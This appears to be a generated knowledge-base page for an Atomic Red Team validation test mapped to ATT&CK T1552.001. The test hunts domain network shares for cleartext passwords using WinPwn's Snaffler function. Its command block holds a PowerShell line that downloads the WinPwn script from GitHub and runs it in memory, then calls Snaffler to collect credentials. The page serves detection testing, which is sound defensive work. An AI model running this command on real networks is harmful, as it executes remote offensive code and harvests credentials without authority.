---
atomic_guid: "fdd0c913-714b-4c13-b40f-1824d6c015f2"
title: "WinPwn - Snaffler"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.001"
attack_technique_name: "Unsecured Credentials: Credentials In Files"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "fdd0c913-714b-4c13-b40f-1824d6c015f2"
  - "WinPwn - Snaffler"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Snaffler

Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn

## Metadata

- Atomic GUID: fdd0c913-714b-4c13-b40f-1824d6c015f2
- Technique: T1552.001: Unsecured Credentials: Credentials In Files
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1552.001/T1552.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials|T1552.001]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Snaffler -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.yaml)
